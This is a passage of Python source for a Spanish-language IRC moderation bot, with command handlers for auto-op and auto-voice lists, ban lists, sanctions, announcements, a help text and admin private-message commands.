                self.pm(canal, f"\x034[NOTIFY]\x03 \x0312{nick_obj}\x03 ya estaba en la lista.")
        elif sub == "del":
            if not nick_obj:
                self.pm(canal, "Uso: \x0312!notify del <nick>\x03")
                return
            if self.gestor_notify.eliminar(nick_obj):
                self.pm(canal, f"\x033[NOTIFY]\x03 \x0312{nick_obj}\x03 eliminado de la lista.")
            else:
                self.pm(canal, f"\x034[NOTIFY]\x03 \x0312{nick_obj}\x03 no estaba en la lista.")
        elif sub == "list":
            lista = self.gestor_notify.listar()
            if lista:
                # Mostrar con estado online/offline
                items = []
                for n in lista:
                    estado = self.gestor_notify.estado(n)
                    if estado is True:
                        items.append(f"\x033{n}\x03")   # verde = online
                    elif estado is False:
                        items.append(f"\x034{n}\x03")   # rojo = offline
                    else:
                        items.append(f"\x0312{n}\x03")  # azul = desconocido
                self.pm(canal, f"\x033[NOTIFY]\x03 Lista ({len(lista)}): {', '.join(items)}")
            else:
                self.pm(canal, "\x033[NOTIFY]\x03 La lista está vacía.")
        else:
            self.pm(canal, "Uso: \x0312!notify add|del|list <nick>\x03")

    def _cmd_anuncia(self, nick: str, canal: str, args: List[str]) -> None:
        pral  = self.cfg.canal_principal
        tipos = list(self._ANUNCIOS.keys())
        if not args:
            self.pm(canal, f"Sintaxis: \x0312!anuncia <{'|'.join(tipos)}>")
            return
        tipo = args[0].lower()
        if tipo == "reglas":
            tipo = "normas"
        if tipo not in self._ANUNCIOS:
            self.pm(canal, f"\x034Error:\x03 tipo inválido. Opciones: \x0312{'|'.join(tipos)}")
            return
        # Enviar el anuncio
        for linea in self._ANUNCIOS[tipo]:
            self.pm(pral, linea)
        # Programar repetición automática
        attr = f"_timer_anuncia_{tipo}"
        timer_anterior = getattr(self, attr, None)
        if timer_anterior and timer_anterior.is_alive():
            self.pm(canal, f"\x034[ANUNCIA]\x03 El anuncio '\x0312{tipo}\x03' ya está activo.")
            return
        if timer_anterior:
            timer_anterior.cancel()
        intervalo = self._ANUNCIA_INTERVALO[tipo]

        def _repetir() -> None:
            for linea in self._ANUNCIOS[tipo]:
                self.pm(pral, linea)
            t = threading.Timer(intervalo, _repetir)
            t.daemon = True
            t.start()
            setattr(self, attr, t)

        t = threading.Timer(intervalo, _repetir)
        t.daemon = True
        t.start()
        setattr(self, attr, t)
        horas = intervalo // 3600
        self.pm(canal, f"\x033OK\x03 Anuncio '\x0312{tipo}\x03' activado — se repetirá cada \x0312{horas}h\x03.")

    def _cmd_autoop(self, nick: str, hostmask: str, canal: str, args: List[str]) -> None:
        if not self._rol_minimo(nick, hostmask, "admin"):
            self.pm(canal, f"\x034[Acceso Denegado!]\x03 Se requiere rol \x0312admin\x03 o superior.")
            return
        pral = self.cfg.canal_principal
        sub  = args[0].lower() if args else ""
        if not sub or sub == "help":
            self.pm(canal, "\x0312!aop add <nick>\x03 — Añadir · \x0312!aop del <nick>\x03 — Eliminar · \x0312!aop list\x03 — Ver lista")
        elif sub == "add":
            if len(args) < 2:
                self.pm(canal, "Uso: \x0312!aop add <nick>\x03")
                return
            nick_obj = args[1]
            mascara  = f"{nick_obj.lower()}!*@*"
            if self.db.autoop_agregar(pral, mascara):
                self.pm(self.cfg.canal_ops, f"\x033[AOP]\x03 \x0312{nick_obj}\x03 añadido al autoop de \x033{pral}\x03.")
                if nick_obj.lower() in self._members.get(pral.lower(), set()):
                    self.modo(pral, "+o", nick_obj)
            else:
                self.pm(canal, f"\x034[AOP]\x03 \x0312{nick_obj}\x03 ya estaba en el autoop.")
        elif sub == "del":
            if len(args) < 2:
                self.pm(canal, "Uso: \x0312!aop del <nick>\x03")
                return
            nick_obj = args[1]
            mascara  = f"{nick_obj.lower()}!*@*"
            if self.db.autoop_eliminar(pral, mascara):
                self.pm(self.cfg.canal_ops, f"\x033[AOP]\x03 \x0312{nick_obj}\x03 eliminado del autoop de \x033{pral}\x03.")
            else:
                self.pm(canal, f"\x034[AOP]\x03 \x0312{nick_obj}\x03 no estaba en el autoop.")
        elif sub == "list":
            lista = self.db.canal_listar("autos", pral)
            if lista:
                self.pm(canal, f"\x033[AOP]\x03 Autoop de \x033{pral}\x03: \x0312{', '.join(lista)}\x03")
            else:
                self.pm(canal, f"\x033[AOP]\x03 No hay nicks en el autoop de \x033{pral}\x03.")
        else:
            self.pm(canal, "Uso: \x0312!aop add|del|list <nick>\x03")

    def _cmd_adown(self, nick: str, hostmask: str, canal: str, args: List[str]) -> None:
        if not self._rol_minimo(nick, hostmask, "admin"):
            self.pm(canal, f"\x034[Acceso Denegado!]\x03 Se requiere rol \x0312admin\x03 o superior.")
            return
        pral = self.cfg.canal_principal
        sub  = args[0].lower() if args else ""
        if not sub or sub == "help":
            self.pm(canal, "\x0312!adown add <nick>\x03 — Añadir · \x0312!adown del <nick>\x03 — Eliminar · \x0312!adown list\x03 — Ver lista")
        elif sub == "add":
            if len(args) < 2:
                self.pm(canal, "Uso: \x0312!adown add <nick>\x03")
                return
            nick_obj = args[1]
            mascara  = f"{nick_obj.lower()}!*@*"
            if self.db.adown_agregar(pral, mascara):
                self.pm(self.cfg.canal_ops, f"\x033[ADOWN]\x03 \x0312{nick_obj}\x03 añadido a la lista adown de \x033{pral}\x03.")
                if nick_obj.lower() in self._members.get(pral.lower(), set()):
                    self.modo(pral, "-o", nick_obj)
            else:
                self.pm(canal, f"\x034[ADOWN]\x03 \x0312{nick_obj}\x03 ya estaba en la lista adown.")
        elif sub == "del":
            if len(args) < 2:
                self.pm(canal, "Uso: \x0312!adown del <nick>\x03")
                return
            nick_obj = args[1]
            mascara  = f"{nick_obj.lower()}!*@*"
            if self.db.adown_eliminar(pral, mascara):
                self.pm(self.cfg.canal_ops, f"\x033[ADOWN]\x03 \x0312{nick_obj}\x03 eliminado de la lista adown de \x033{pral}\x03.")
            else:
                self.pm(canal, f"\x034[ADOWN]\x03 \x0312{nick_obj}\x03 no estaba en la lista adown.")
        elif sub == "list":
            lista = self.db.canal_listar("adown", pral)
            if lista:
                self.pm(canal, f"\x033[ADOWN]\x03 Lista adown de \x033{pral}\x03: \x0312{', '.join(lista)}\x03")
            else:
                self.pm(canal, f"\x033[ADOWN]\x03 No hay nicks en la lista adown de \x033{pral}\x03.")
        else:
            self.pm(canal, "Uso: \x0312!adown add|del|list <nick>\x03")

    def _cmd_avoice(self, nick: str, hostmask: str, canal: str, args: List[str]) -> None:
        if not self._rol_minimo(nick, hostmask, "mod"):
            self.pm(canal, f"\x034[Acceso Denegado!]\x03 Se requiere rol \x0312mod\x03 o superior.")
            return
        pral = self.cfg.canal_principal
        sub  = args[0].lower() if args else ""
        if not sub or sub == "help":
            self.pm(canal, "\x0312!avoice add <nick>\x03 — Añadir · \x0312!avoice del <nick>\x03 — Eliminar · \x0312!avoice list\x03 — Ver lista")
        elif sub == "add":
            if len(args) < 2:
                self.pm(canal, "Uso: \x0312!avoice add <nick>\x03")
                return
            nick_obj = args[1]
            mascara  = f"{nick_obj.lower()}!*@*"
            if self.db.avoice_agregar(pral, mascara):
                self.pm(self.cfg.canal_ops, f"\x033[AVOICE]\x03 \x0312{nick_obj}\x03 añadido al avoice de \x033{pral}\x03.")
                if nick_obj.lower() in self._members.get(pral.lower(), set()):
                    self.modo(pral, "+v", nick_obj)
            else:
                self.pm(canal, f"\x034[AVOICE]\x03 \x0312{nick_obj}\x03 ya estaba en el avoice.")
        elif sub == "del":
            if len(args) < 2:
                self.pm(canal, "Uso: \x0312!avoice del <nick>\x03")
                return
            nick_obj = args[1]
            mascara  = f"{nick_obj.lower()}!*@*"
            if self.db.avoice_eliminar(pral, mascara):
                self.pm(self.cfg.canal_ops, f"\x033[AVOICE]\x03 \x0312{nick_obj}\x03 eliminado del avoice de \x033{pral}\x03.")
            else:
                self.pm(canal, f"\x034[AVOICE]\x03 \x0312{nick_obj}\x03 no estaba en el avoice.")
        elif sub == "list":
            lista = self.db.canal_listar("voices", pral)
            if lista:
                self.pm(canal, f"\x033[AVOICE]\x03 Avoice de \x033{pral}\x03: \x0312{', '.join(lista)}\x03")
            else:
                self.pm(canal, f"\x033[AVOICE]\x03 No hay nicks en el avoice de \x033{pral}\x03.")
        else:
            self.pm(canal, "Uso: \x0312!avoice add|del|list <nick>\x03")

    def _cmd_sancionar(self, mod: str, canal: str, cmd: str, args: List[str], tipos: Dict[str, str]) -> None:
        if not args:
            self.pm(canal, f"Uso: {cmd} <nick>")
            return
        
        nick_obj = args[0]
        for arg in args:
            if any(c.isalnum() for c in arg) or "!" in arg or "@" in arg or "." in arg:
                nick_obj = arg
                break

        # Si había motivo (solo válido para !kb normalmente)
        if cmd == "!kb" and nick_obj in args:
            idx = args.index(nick_obj)
            motivo = " ".join(args[idx+1:])
        else:
            motivo = ""

        canal_pral = self.cfg.canal_principal
        if self.es_op(canal_pral, nick_obj):
            self.pm(canal, "\x034[Acceso Denegado!]\x03 No puedes sancionar a un Operador.")
            return
        if nick_obj.lower() not in self._members.get(canal_pral.lower(), set()):
            self.pm(canal, f"\x034[Error]\x03 \x0312{nick_obj}\x03 no esta en \x033{canal_pral}\x03.")
            return
        self._sancionar(nick_obj, canal_pral, tipos[cmd], motivo, por=mod)

    def _help_canal(self, nick: str, canal: str) -> None:
        n    = self.cfg.nick
        pral = self.cfg.canal_principal
        def l(txt): self.notice(nick, txt)
        l(f"\x034Comandos del bot \x0312{n}\x03")
        l("\x03 ")
        l(f"\x0312!op\x03 te da status de Operador en {pral}.")
        l(f"\x0312!deop\x03 te quita status de Operador en {pral}.")
        l(f"\x0312!aop\x03 add|del|list <nick> gestiona el auto-op (+o).")
        l(f"\x0312!avoice\x03 add|del|list <nick> gestiona el auto-voice (+v).")
        l(f"\x0312!getip\x03 <nick> muestra fragmento de host y comando de ban.")
        l(f"\x0312!getip\x03 <nick> ibl incluye adem\xe1s el ban permanente IBL.")
        l(f"\x0312!aka\x03 <nick> muestra el historial completo de nicks del host.")
        l(f"\x0312!km\x03 <nick> sanciona a un nick por abuso de may\xfasculas.")
        l(f"\x0312!kr\x03 <nick> sanciona a un nick por abuso de repeticiones.")
        l(f"\x0312!ki\x03 <nick> sanciona a un nick por insultar.")
        l(f"\x0312!ks\x03 <nick> sanciona a un nick por tem\xe1tica sexual.")
        l(f"\x0312!kd\x03 <nick> sanciona a un nick por dar datos personales.")
        l(f"\x0312!ksp\x03 <nick> sanciona a un nick por hacer spam.")
        l(f"\x0312!seen/!visto\x03 <nick>|top|stats muestra \xfaltima vez o estad\xedsticas.")
        l(f"\x0312!blclear\x03 vac\xeda la lista negra del canal.")
        l(f"\x0312!kb\x03 <nick> <motivo> sanciona a un nick por el motivo que indiquemos.")
        l(f"\x0312!BLAdd\x03 <nick|vhost> [motivo] a\xf1ade a la lista negra y expulsa.")
        l(f"\x0312!BLDel\x03 <nick> elimina de la lista negra.")
        l(f"\x0312!BLClear\x03 vac\xeda la lista negra por completo.")
        l(f"\x0312!BList\x03 muestra la lista negra completa.")
        l(f"\x0312!ub/!unban\x03 <nick> quita el ban de un nick en {pral}.")
        l(f"\x0312!ban\x03 <nick|mask> aplica ban sin expulsar (silenciar).")
        l(f"\x0312!clearbans\x03 limpia bans antiguos (>6h) e inteligentes.")
        l(f"\x0312!ibladd/!ibldel/!iblist\x03 gestiona bans protegidos permanentes.")
        l(f"\x0312!lock\x03 on|off|status bloquea o desbloquea el canal.")
        l(f"\x0312!wl\x03 add|del|list <nick> gestiona la whitelist durante el lock.")
        l(f"\x0312!topiclock\x03 on|off protege el topic del canal.")
        l(f"\x0312!anuncia\x03 <tipo> envía un anuncio a {pral} con repetición automática.")
        l(f"\x0312!notify\x03 add|del|list <nick> vigila conexiones de nicks.")

    # Comandos PM

    def _on_msg_privado(self, nick: str, hostmask: str, texto: str) -> None:
        if not self.es_admin(nick, hostmask):
            return
        
        self._notify_telegram(f"🔐 <b>Privado</b> de {nick}: <code>{texto}</code>")
        
        partes = texto.strip().split()
        cmd    = partes[0].lower() if partes else ""
        sub    = partes[1].lower() if len(partes) > 1 else ""
        args   = partes[2:]

        # Dispatch limpio: cada entrada apunta a un método real, sin lambdas
        dispatch: Dict[str, _CmdHandler] = {
            "canal":  self._c_lista_canales,
            "mod":    self._c_mods,
            "admin":  self._c_admins,
            "bot":    self._c_bots,
            "set":    self._c_set,
            "text":   self._c_texto,
            "spam":   self._c_spam_canal,
            "nick":   self._c_nick_canal,
            "enick":  self._c_enick_canal,
            "ibl":    self._c_ibl,
            "autoop": self._c_autoop,
            "avoice": self._c_avoice,
            "aka":     self._c_aka,
            "seen":    self._c_seen_pm,
            "visto":   self._c_seen_pm,
            "notify":  self._c_notify_pm,
            "getip":   self._c_getip_pm,
            "rango":   self._c_rango,
            "backup":  self._c_backup_pm,
            "join":    self._c_join,
            "ayuda":   self._c_ayuda_pm,
            "restart": self._c_restart,
        }
        handler = dispatch.get(cmd)
        if handler:
            handler(nick, sub, args)
        else:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda\x03 para más información.")

    # Wrappers de dispatch (reemplazan las lambdas)

    def _c_mods(self, nick: str, sub: str, args: List[str]) -> None:
        self._c_lista_global(nick, "moderadores.dat", sub, args, "moderador")

    def _c_admins(self, nick: str, sub: str, args: List[str]) -> None:
        self._c_lista_global(nick, "admins.txt", sub, args, "admin")

    def _c_bots(self, nick: str, sub: str, args: List[str]) -> None:
        self._c_lista_global(nick, "bots.dat", sub, args, "bot")

    def _c_texto(self, nick: str, sub: str, args: List[str]) -> None:
        self._c_dato_canal(nick, "text", sub, args)

    def _c_restart(self, nick: str, sub: str, args: List[str]) -> None:
        """Reinicia el bot. Solo accesible para admins y roots (el dispatch ya filtra admins+)."""
        self.pm(nick, f"\x034Reiniciando \x0312{self.cfg.nick}\x03... hasta ahora.")
        self.debug(f"\x034[RESTART]\x03 Reinicio solicitado por \x034{nick}\x03")
        if self._conn:
            try:
                self._conn.disconnect("Reiniciando...")
            except Exception:
                pass
        # Pequeña pausa para que el QUIT llegue al servidor antes de renacer
        time.sleep(1)
        # os.execv falla silenciosamente cuando se llama desde un hilo no-principal
        # (caso habitual: reactor de irc.client). Solución: Popen crea un proceso
        # hijo independiente y luego sys.exit() cierra el actual limpiamente.
        subprocess.Popen([sys.executable] + sys.argv)
        sys.exit(0)

    def _c_backup_pm(self, nick: str, sub: str, args: List[str]) -> None:
        self._c_backup(nick)

    def _c_aka(self, nick: str, sub: str, args: List[str]) -> None:
        self._cmd_aka_canal(nick, self.cfg.canal_principal, [sub] + args if sub else [])

    def _c_seen_pm(self, nick: str, sub: str, args: List[str]) -> None:
        self._cmd_seen(nick, self.cfg.canal_principal, [sub] + args if sub else [])

    def _c_getip_pm(self, nick: str, sub: str, args: List[str]) -> None:
        self._cmd_getip(nick, [sub] + args if sub else [])

    def _c_notify_pm(self, nick: str, sub: str, args: List[str]) -> None:
        self._cmd_notify(nick, self.cfg.canal_principal, [sub] + args if sub else [])

    def _c_ayuda_pm(self, nick: str, sub: str, args: List[str]) -> None:
        # Soporte para claves compuestas: "ayuda text add", "ayuda spam del", etc.
        sub2 = args[0].lower() if args else ""
        self._c_ayuda(nick, sub, sub2)

    # Comandos PM: implementaciones

    def _c_lista_global(self, nick: str, fichero: str, sub: str, args: List[str], nombre: str) -> None:
        if sub == "list":
            items = self.db.global_listar(fichero)
            nicks = [it.split("!")[0] for it in items]
            self._lista_notice(nick, f"— {nombre}s ({len(nicks)}) —",
                               [f"\x0312{n}\x03" for n in nicks],
                               f"Actualmente no hay ningún {nombre} agregado.")

        elif sub == "add":
            if not args:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda {nombre} add\x03 para más información.")
                return
            nick_extraido = args[0].split("!")[0].strip().lower()
            mascara       = f"{nick_extraido}!*@*"
            if self.db.global_agregar(fichero, mascara):
                self.pm(nick, f"\x0310¡Estupendo!\x03 El nick \x0312{nick_extraido}\x03 ha sido agregado como {nombre}.")
                self.pm(self.cfg.canal_ops,
                    f"El Administrador \x034{nick}\x03 ha agregado el nick \x0312{nick_extraido}\x03 como {nombre}.")
            else:
                self.pm(nick, f"\x034¡Error!\x03 El nick \x0312{nick_extraido}\x03 ya se encuentra en la lista de {nombre}s.")

        elif sub == "del":
            if not args:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda {nombre} del\x03 para más información.")
                return
            objetivo   = args[0]
            eliminado  = self.db.global_eliminar(fichero, objetivo)
            eliminada2 = None if eliminado else self.db.global_eliminar_por_nick(fichero, objetivo)
            if eliminado or eliminada2:
                nick_eli = eliminada2 if eliminada2 else objetivo
                nick_eli_limpio = nick_eli.split("!")[0]
                self.pm(nick, f"\x0310¡Estupendo!\x03 El nick \x0312{nick_eli_limpio}\x03 ha sido eliminado de la lista de {nombre}s.")
                self.pm(self.cfg.canal_ops,
                    f"El Administrador \x034{nick}\x03 ha eliminado el nick \x0312{nick_eli_limpio}\x03 de la lista de {nombre}s.")
            else:
                self.pm(nick, f"\x034¡Error!\x03 El nick \x0312{objetivo}\x03 no se encuentra en la lista de {nombre}s.")

        else:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda {nombre}\x03 para más información.")

    def _c_rango(self, nick: str, sub: str, args: List[str]) -> None:
        if sub == "list":
            items = self.db.global_listar("rango.dat")
            self._lista_notice(nick, "— Canales con supervisión de rango —",
                               [f"\x0312{it}\x03" for it in items],
                               "Actualmente no hay ningún canal en supervisión de rango.")
        elif sub in ("add", "del"):
            if not args:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda rango {sub}\x03 para más información.")
                return
            canal = args[0]
            if not canal.startswith("#"):
                self.pm(nick, "\x034¡Error!\x03 El canal debe comenzar por el símbolo \x0312#\x03")
                return
            if sub == "add":
                if self.db.global_agregar("rango.dat", canal):
                    self.pm(nick, f"\x0310¡Estupendo!\x03 El canal \x0312{canal}\x03 ha sido agregado a la supervisión de rango.")
                    if self.cfg.canal_ops:
                        self.pm(self.cfg.canal_ops,
                            f"El Administrador \x034{nick}\x03 ha agregado \x033{canal}\x03 a supervisión de rango.")
                else:
                    self.pm(nick, f"\x034¡Error!\x03 El canal \x0312{canal}\x03 ya se encuentra en supervisión de rango.")
            else:
                if self.db.global_eliminar("rango.dat", canal):
                    self.pm(nick, f"\x0310¡Estupendo!\x03 El canal \x0312{canal}\x03 ha sido eliminado de la supervisión de rango.")
                    if self.cfg.canal_ops:
                        self.pm(self.cfg.canal_ops,
                            f"El Administrador \x034{nick}\x03 ha eliminado \x033{canal}\x03 de supervisión de rango.")
                else:
                    self.pm(nick, f"\x034¡Error!\x03 El canal \x0312{canal}\x03 no se encuentra en la lista.")
        else:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda rango\x03 para más información.")

    def _c_autoop(self, nick: str, sub: str, args: List[str]) -> None:
        if not args:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda autoop\x03 para más información.")
            return
        canal = args[0]
        mask  = " ".join(args[1:]) if len(args) > 1 else ""
        if not self._validar_canal_registrado(nick, canal):
            return
        if sub == "list":
            items = self.db.canal_listar("autos", canal)
            self._lista_notice(nick, f"— Máscaras de autoop del canal {canal} —",
                               [f"\x0312{it}\x03" for it in items],
                               f"El canal \x0312{canal}\x03 no tiene actualmente ninguna máscara de autoop.")
        elif sub in ("add", "del"):
            if not mask:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda autoop {sub}\x03 para más información.")
                return
            if sub == "add":
                if self.db.autoop_agregar(canal, mask):
                    self.pm(nick, f"\x0310¡Estupendo!\x03 La máscara \x0312{mask}\x03 ha sido agregada al autoop del canal \x033{canal}\x03.")
                    if self.cfg.canal_ops:
                        self.pm(self.cfg.canal_ops,
                            f"El Administrador \x034{nick}\x03 ha agregado la máscara de autoop \x0312{mask}\x03 en \x033{canal}\x03.")
                else:
                    self.pm(nick, f"\x034¡Error!\x03 La máscara \x0312{mask}\x03 ya se encuentra en el autoop del canal \x033{canal}\x03.")
            else:
                if self.db.autoop_eliminar(canal, mask):
                    self.pm(nick, f"\x0310¡Estupendo!\x03 La máscara \x0312{mask}\x03 ha sido eliminada del autoop del canal \x033{canal}\x03.")
                    if self.cfg.canal_ops:
                        self.pm(self.cfg.canal_ops,
                            f"El Administrador \x034{nick}\x03 ha eliminado la máscara de autoop \x0312{mask}\x03 de \x033{canal}\x03.")
                else:
                    self.pm(nick, f"\x034¡Error!\x03 La máscara \x0312{mask}\x03 no está en el autoop del canal \x033{canal}\x03.")
        else:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda autoop\x03 para más información.")

    def _c_avoice(self, nick: str, sub: str, args: List[str]) -> None:
        if not args:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda avoice\x03 para más información.")
            return
        canal = args[0]
        mask  = " ".join(args[1:]) if len(args) > 1 else ""
        if not self._validar_canal_registrado(nick, canal):
            return
        if sub == "list":
            items = self.db.canal_listar("voices", canal)
            self._lista_notice(nick, f"— Máscaras de avoice del canal {canal} —",
                               [f"\x0312{it}\x03" for it in items],
                               f"El canal \x0312{canal}\x03 no tiene actualmente ninguna máscara de avoice.")
        elif sub in ("add", "del"):
            if not mask:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda avoice {sub}\x03 para más información.")
                return
            if sub == "add":
                if self.db.avoice_agregar(canal, mask):
                    self.pm(nick, f"\x0310¡Estupendo!\x03 La máscara \x0312{mask}\x03 ha sido agregada al avoice del canal \x033{canal}\x03.")
                    if self.cfg.canal_ops:
                        self.pm(self.cfg.canal_ops,
                            f"El Administrador \x034{nick}\x03 ha agregado la máscara de avoice \x0312{mask}\x03 en \x033{canal}\x03.")
                else:
                    self.pm(nick, f"\x034¡Error!\x03 La máscara \x0312{mask}\x03 ya se encuentra en el avoice del canal \x033{canal}\x03.")
            else:
                if self.db.avoice_eliminar(canal, mask):
                    self.pm(nick, f"\x0310¡Estupendo!\x03 La máscara \x0312{mask}\x03 ha sido eliminada del avoice del canal \x033{canal}\x03.")
                    if self.cfg.canal_ops:
                        self.pm(self.cfg.canal_ops,
                            f"El Administrador \x034{nick}\x03 ha eliminado la máscara de avoice \x0312{mask}\x03 de \x033{canal}\x03.")
                else:
                    self.pm(nick, f"\x034¡Error!\x03 La máscara \x0312{mask}\x03 no está en el avoice del canal \x033{canal}\x03.")
        else:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda avoice\x03 para más información.")

    def _c_ibl(self, nick: str, sub: str, args: List[str]) -> None:
        if sub == "list":
            if not args:
                self.pm(nick, "\x034¡Error!\x03 Uso: !ibl list #canal")
                return
            canal = args[0]
            if not self._validar_canal_registrado(nick, canal):
                return
            items = self.db.ibl_listar(canal)
            self._lista_notice(nick, f"— Máscaras de IBL (Bans protegidos) del canal {canal} —",
                               [f"\x0312{it}\x03" for it in items],
                               f"El canal \x0312{canal}\x03 no tiene actualmente ninguna máscara en la IBL.")
        elif sub in ("add", "del"):
            if len(args) < 2:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda ibl {sub}\x03 para más información.")
                return
            canal   = args[0]
            entrada = " ".join(args[1:])
            if not self._validar_canal_registrado(nick, canal):
                return
            mask, desc = completar_banmask(entrada)
            if not mask:
                self.pm(nick, "\x034¡Error!\x03 Entrada inválida. Formatos válidos: \x03121.2.3.4\x03 | \x03121.2.3\x03 | \x0312fragmento.IP\x03 | \x0312*!*@*.dominio.com\x03")
                return
            if sub == "add":
                if self.db.ibl_agregar(canal, mask):
                    if self.es_op(canal, self.cfg.nick):
                        self.modo(canal, "+b", mask)
                    self.pm(nick, f"\x0310¡Estupendo!\x03 La máscara \x0312{mask}\x03 ha sido agregada a la IBL del canal \x033{canal}\x03 ({desc}).")
                    msg = f"🛡️ <b>IBL Añadido</b> en {canal}: <code>{mask}</code> (por {nick}) - {desc}"
                    self._notify_telegram(msg)
                    if self.cfg.canal_ops:
                        self.pm(self.cfg.canal_ops,
                            f"El Administrador \x034{nick}\x03 ha agregado a la IBL la máscara \x0312{mask}\x03 en \x033{canal}\x03.")
                else:
                    self.pm(nick, f"\x034¡Error!\x03 La máscara \x0312{mask}\x03 ya se encuentra en la lista IBL del canal \x033{canal}\x03.")
            else:
                if self.db.ibl_eliminar(canal, mask):
                    if self.es_op(canal, self.cfg.nick):
                        self.modo(canal, "-b", mask)
                    self.pm(nick, f"\x0310¡Estupendo!\x03 La máscara \x0312{mask}\x03 ha sido eliminada de la IBL del canal \x033{canal}\x03.")
                    msg = f"🔓 <b>IBL Eliminado</b> en {canal}: <code>{mask}</code> (por {nick})"
                    self._notify_telegram(msg)
                    if self.cfg.canal_ops:
                        self.pm(self.cfg.canal_ops,
                            f"El Administrador \x034{nick}\x03 ha eliminado de la IBL la máscara \x0312{mask}\x03 de \x033{canal}\x03.")
                else:
                    self.pm(nick, f"\x034¡Error!\x03 La máscara \x0312{mask}\x03 no se encuentra en la lista IBL del canal \x033{canal}\x03.")
        else:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda ibl\x03 para más información.")

    def _c_set(self, nick: str, sub: str, args: List[str]) -> None:
        if sub == "list":
            if not args:
                self.pm(nick, "\x034¡Error!\x03 Debes indicar el canal.")
                return
            canal = args[0]
            if not self._validar_canal_registrado(nick, canal):
                return
            self.pm(nick, f"\x0310— Lista de protecciones de {canal.upper()} —")
            for proteccion in CanalDB.PROTECCIONES:
                estado = "\x033ON\x03" if self.db.get_proteccion(canal, proteccion) else "\x034OFF\x03"
                self.pm(nick, f"\x0312{proteccion}:\x03 {estado}")
            return
        if len(args) < 2:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda set\x03 para más información.")
            return
        canal, tipo = args[0], args[1]
        if not self._validar_canal_registrado(nick, canal):
            return
        if tipo not in CanalDB.PROTECCIONES:
            self.pm(nick, f"\x034¡Error!\x03 El tipo de protección indicado no es correcto. Por favor, escribe \x0312/msg {self.cfg.nick} set list {canal}\x03")
            return
        nuevo_estado = (sub == "on")
        if self.db.get_proteccion(canal, tipo) == nuevo_estado:
            ya = "Activada" if nuevo_estado else "Desactivada"
            self.pm(nick, f"\x034¡Error!\x03 La protección ya estaba {ya}.")
            return
        self.db.set_proteccion(canal, tipo, nuevo_estado)
        accion = "activada" if nuevo_estado else "desactivada"
        self.pm(nick, f"\x0310¡Estupendo!\x03 La protección \x034{tipo}\x03 ha sido {accion} en el canal \x0312{canal}\x03")
        if self.cfg.canal_ops:
            self.pm(self.cfg.canal_ops,
                f"El Administrador \x034{nick}\x03 ha {accion} la protección \x033{tipo}\x03 en el canal \x0312{canal}\x03")

    def _c_lista_canales(self, nick: str, sub: str, args: List[str]) -> None:
        if sub == "list":
            items = self.db.global_listar("canales.dat")
            self._lista_notice(nick, f"— Canales ({len(items)}) —",
                               [f"\x0312{it}\x03" for it in items], "Actualmente no hay ningún canal agregado.")
        elif sub == "add":
            if not args:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda canal add\x03 para más información.")
                return
            canal = args[0]
            if not canal.startswith("#"):
                self.pm(nick, "\x034¡Error!\x03 El nombre del canal debe estar precedido por el símbolo \x0312#\x03")
                return
            if self.db.global_agregar("canales.dat", canal):
                self.db.init_canal(canal)
                if self._conn:
                    self._conn.join(canal)
                self.pm(nick, f"\x0310¡Estupendo!\x03 El canal \x0312{canal}\x03 ha sido agregado a la BD del Bot.")
                if self.cfg.canal_ops:
                    self.pm(self.cfg.canal_ops,
                        f"El Administrador \x034{nick}\x03 ha agregado el canal \x0312{canal}\x03 a la BD del Bot.")
            else:
                self.pm(nick, f"\x034¡Error!\x03 El canal \x0312{canal}\x03 ya se encuentra en la BD del bot.")
        elif sub == "del":
            if not args:
                self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda canal del\x03 para más información.")
                return
            if self.db.global_eliminar("canales.dat", args[0]):
                if self._conn:
                    self._conn.part(args[0], "Canal eliminado.")
                self.pm(nick, f"\x0310¡Estupendo!\x03 El canal \x0312{args[0]}\x03 ha sido eliminado de la BD del Bot.")
            else:
                self.pm(nick, f"\x034¡Error!\x03 El canal \x0312{args[0]}\x03 no se encuentra en la Base de Datos.")
        else:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda canal\x03 para más información.")

    def _c_join(self, nick: str, sub: str, args: List[str]) -> None:
        # Acepta tanto 'join #canal' (sub) como 'join #canal' con args extra
        canal = sub or (args[0] if args else "")
        if not canal:
            self.pm(nick, f"\x034¡Comando Incorrecto!\x03 Escribe \x0312/msg {self.cfg.nick} ayuda join\x03 para más información.")
            return
        if not canal.startswith("#"):
            self.pm(nick, "\x034¡Error!\x03 El canal debe comenzar por el símbolo \x0312#\x03")
            return
        if self._conn:
            self._conn.join(canal)
        self.pm(nick, f"Has metido al bot en \x0312{canal}\x03.")

    def _c_dato_canal(self, nick: str, tipo: str, sub: str, args: List[str]) -> None:
        n_item = "frase" if tipo == "text" else tipo
        if not args:
